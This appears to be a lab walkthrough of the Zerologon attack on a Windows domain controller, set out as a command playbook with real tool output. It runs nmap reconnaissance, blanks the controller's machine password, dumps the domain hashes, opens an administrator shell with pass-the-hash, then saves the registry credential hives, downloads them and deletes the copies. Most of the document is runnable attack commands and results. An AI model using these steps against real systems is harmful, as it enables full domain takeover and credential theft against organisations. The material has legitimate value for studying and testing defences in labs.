KEY:
====
Windows commands start with: C:\>
Linux commands start with: #

Before you begin:
=================
you need the Domain Name for the Windows Domain Controller you are attacking
you need the NetBIOS Name (PC name) for the Windows Domain Controller you are attacking
you need the IP address for the Windows Domain Controller you are attacking
That is all!!

Nmap to the rescue:
===================
# sudo nmap -sV 192.168.1.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 17:23 PDT
Nmap scan report for 192.168.1.28
Host is up (0.00019s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-10-15 20:58:08Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: ZEROLOGON)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/15%Time=5F88E827%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.43 seconds


Find the DC specifically:
=========================
All domain controllers listen on port 389
# sudo nmap -p389 -sV 192.168.1.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:25 PDT
Nmap scan report for 192.168.1.28
Host is up (0.00037s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds


use NMap to scan an address range with the ldap-rootdse script:
===============================================================
# sudo nmap -p 389 -T4 -A -v --script ldap-rootdse 192.168.1.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:27 PDT
NSE: Loaded 46 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Initiating ARP Ping Scan at 22:27
Scanning 192.168.1.28 [1 port]
Completed ARP Ping Scan at 22:27, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:27
Completed Parallel DNS resolution of 1 host. at 22:27, 0.01s elapsed
Initiating SYN Stealth Scan at 22:27
Scanning 192.168.1.28 [1 port]
Discovered open port 389/tcp on 192.168.1.28
Completed SYN Stealth Scan at 22:27, 0.00s elapsed (1 total ports)
Initiating Service scan at 22:27
Scanning 1 service on 192.168.1.28
Completed Service scan at 22:27, 6.01s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.1.28
Retrying OS detection (try #2) against 192.168.1.28
NSE: Script scanning 192.168.1.28.
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Nmap scan report for 192.168.1.28
Host is up (0.0011s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20201015204910.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=zerologon,DC=learn,DC=now
|       dsServiceName: CN=NTDS Settings,CN=ZEROLOGON-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=zerologon,DC=learn,DC=now
|       namingContexts: DC=zerologon,DC=learn,DC=now
|       namingContexts: CN=Configuration,DC=zerologon,DC=learn,DC=now
|       namingContexts: CN=Schema,CN=Configuration,DC=zerologon,DC=learn,DC=now
|       namingContexts: DC=DomainDnsZones,DC=zerologon,DC=learn,DC=now
|       namingContexts: DC=ForestDnsZones,DC=zerologon,DC=learn,DC=now
|       defaultNamingContext: DC=zerologon,DC=learn,DC=now
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=zerologon,DC=learn,DC=now
|       configurationNamingContext: CN=Configuration,DC=zerologon,DC=learn,DC=now
|       rootDomainNamingContext: DC=zerologon,DC=learn,DC=now
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 16410
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: ZEROLOGON-DC.zerologon.learn.now
|       ldapServiceName: zerologon.learn.now:zerologon-dc$@ZEROLOGON.LEARN.NOW
|       serverName: CN=ZEROLOGON-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=zerologon,DC=learn,DC=now
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7
|       forestFunctionality: 7
|_      domainControllerFunctionality: 7
MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|7 (98%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7::-:professional
Aggressive OS guesses: Microsoft Windows Server 2016 (98%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.003 days (since Thu Oct 15 22:23:15 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.1.28

NSE: Script Post-scanning.
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Initiating NSE at 22:27
Completed NSE at 22:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
           Raw packets sent: 76 (7.036KB) | Rcvd: 20 (1.540KB)


change directory to the zerologon exploit folder:
=================================================

# cd ~/zerologon


run the first script to exploit the machine:
============================================
this will set the password to an empty string
ZEROLOGON-DC is the PC's name
192.168.1.28 is the IP address it was assigned on my network

# python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28

look for:
Success! DC should now have the empty string as its machine password.


run the second script to dump the hashes:
=========================================
ZEROLOGON/ZEROLOGON-DC\$@192.168.1.28
<Domain> / <NETBIOS name (PC name)> \$@ <ip address of server we are attacking>
it is important to have \$@ in between the NetBIOS name and the IP 

# secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ZEROLOGON/ZEROLOGON-DC\$@192.168.1.28

looking for:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::


run the third script to get terminal on victim machine:
=======================================================
ZEROLOGON/Administrator@192.168.1.28
<Domain> / <user name> @ <ip address> -hashes <administrator hash>

# wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976

Looking for:
C:\>


Commands to run once on victim machine:
=======================================
verify who you are logged in as:
C:\>whoami
zerologon\administrator

verify the system you are logged into:
C:\>hostname
ZEROLOGON-DC

Prep logon credentials for download:
C:\>reg save HKLM\SYSTEM system.save
The operation completed successfully.

C:\>reg save HKLM\SAM sam.save
The operation completed successfully.

C:\>reg save HKLM\SECURITY security.save
The operation completed successfully.

Download logon credentials:
C:\>get system.save
[*] Downloading C:\\system.save

C:\>get sam.save
[*] Downloading C:\\sam.save

C:\>get security.save
[*] Downloading C:\\security.save

Clean up:
C:\>del /f system.save
C:\>del /f sam.save
C:\>del /f security.save


Exit out and go back to Linux terminal: 
=======================================

# secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

Looking for:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::


Restore the original password:
==============================
ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
<pc name> <ip address> <admin hash>

# python3 reinstall_original_pw.py ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
